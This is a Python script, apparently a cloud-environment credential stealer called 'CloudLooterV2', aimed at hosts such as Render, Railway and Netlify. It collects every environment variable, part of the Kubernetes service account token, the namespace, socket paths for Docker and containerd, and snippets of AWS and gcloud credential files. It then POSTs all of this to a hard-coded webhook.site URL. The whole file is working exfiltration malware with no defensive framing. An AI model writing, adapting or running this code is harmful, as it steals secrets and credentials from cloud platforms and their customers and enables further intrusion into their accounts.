import os, json, socket, urllib.request, subprocess

WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"

class CloudLooterV2:
    def __init__(self):
        self.loot = {"k8s_secrets": {}, "socket_scan": {}, "filesystem_deep": {}, "env": dict(os.environ)}

    def check_k8s_api(self):
        """Проверка доступа к API Kubernetes (Render/Railway/Netlify)"""
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        if os.path.exists(token_path):
            try:
                with open(token_path, 'r') as f:
                    self.loot["k8s_secrets"]["sa_token_snippet"] = f.read(50) + "..."
                self.loot["k8s_secrets"]["namespace"] = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read()
            except:
                self.loot["k8s_secrets"]["status"] = "Found but restricted"

    def probe_sockets(self):
        """Проверка системных сокетов (то, что мы видели в /dev и /run)"""
        potential_sockets = [
            "/dev/otel-grpc.sock",      # Railway telemetry
            "/var/run/docker.sock",     # Docker Engine
            "/run/containerd/containerd.sock", 
            "/tmp/netlify_config.json"
        ]
        for sock in potential_sockets:
            if os.path.exists(sock):
                self.loot["socket_scan"][sock] = "EXISTS"
                # Пробуем определить тип (файл или сокет)
                self.loot["socket_scan"][sock + "_type"] = oct(os.stat(sock).st_mode)

    def deep_search(self):
        """Поиск конфигов облачных CLI"""
        search_paths = [
            os.path.expanduser("~/.aws/credentials"),
            os.path.expanduser("~/.config/gcloud/configurations/config_default"),
            "/opt/render/.render-build-status",
            "/mise/config.toml"
        ]
        for path in search_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        self.loot["filesystem_deep"][path] = f.read(100)
                except:
                    self.loot["filesystem_deep"][path] = "Found but No Access"

    def send(self):
        payload = json.dumps(self.loot).encode()
        req = urllib.request.Request(WEBHOOK_URL, data=payload, method='POST')
        urllib.request.urlopen(req)

if __name__ == "__main__":
    scanner = CloudLooterV2()
    scanner.check_k8s_api()
    scanner.probe_sockets()
    scanner.deep_search()
    scanner.send()
